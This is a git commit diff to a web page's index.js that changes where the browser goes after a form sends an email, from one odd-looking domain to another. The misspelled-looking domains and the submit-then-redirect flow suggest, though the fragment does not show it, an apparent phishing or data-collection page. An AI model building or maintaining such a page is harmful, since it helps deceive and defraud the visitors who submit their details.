e9709886aa08b8918182b9447d58459103fad877
husknet <127146284+husknet@users.noreply.github.com>
2025-01-23 18:13:15 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://ss.nemolightlng.com/';
+        window.location.href = 'https://san.flnitionelegance.com/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
